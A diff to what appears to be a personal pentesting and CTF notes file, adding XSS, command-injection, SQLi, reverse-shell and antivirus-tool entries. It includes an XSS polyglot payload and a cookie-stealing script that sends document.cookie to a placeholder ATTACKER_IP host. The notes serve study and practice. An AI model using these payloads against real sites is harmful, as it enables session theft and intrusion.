@@ -71,12 +71,30 @@
 - Inspect Webhook and HTTP Requests
   - [requestbin.com](requestbin.com)
 - [Beef](https://beefproject.com/)
-- Blind XSS
-  - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
+- XSS
+  - Blind XSS
+    - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
+  - XSS Polyglot
+    ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
+  - Cookie Stealing XSS
+    ```
+    </textarea><script>fetch('http://ATTACKER_IP:PORT?cookie=' + btoa(document.cookie) );</script>
+    ```
+- Command Injection
+  - [Payload List](https://github.com/payloadbox/command-injection-payload-list)
+- SQLi
+  - In-Band
+  - Blind
+    - Authentication Bypass
+    - Boolean-based
+    - Time-based
+  - Out-of-Band
 - 
 
 #### Network Services
 
+* [netcat](https://en.wikipedia.org/wiki/Netcat)
+* [socat](https://www.kali.org/tools/socat/)
 * [nmap](https://nmap.org/)
   * Common
     * ``nmap -A -sC -sV -p- -T4 --min-rate=9326 -vv MACHINE_IP``
@@ -162,6 +180,9 @@
   * mysql_sql
   * mysql_schemadump
   * mysql_hashdump
+  * multi/handler
+  * msfvenom
+* [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * 
 
 #### Priviledge Escalation
@@ -213,7 +234,15 @@
 - [https://github.com/PatrikH0lop/malware_showcase](https://github.com/PatrikH0lop/malware_showcase)
 - [Yara Rules](https://yara.readthedocs.io/en/stable/writingrules.html)
 - Static Malware Analysis
+
   - [PEStudio](https://www.winitor.com/download)
+- AV
+
+  - [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker)
+  - Open Source
+    - [ClamAV](https://www.clamav.net/)
+  - [AntiscanMe](https://antiscan.me/)
+  - [Jotti](https://virusscan.jotti.org/)
 - 
 
 #### Hardware Tools
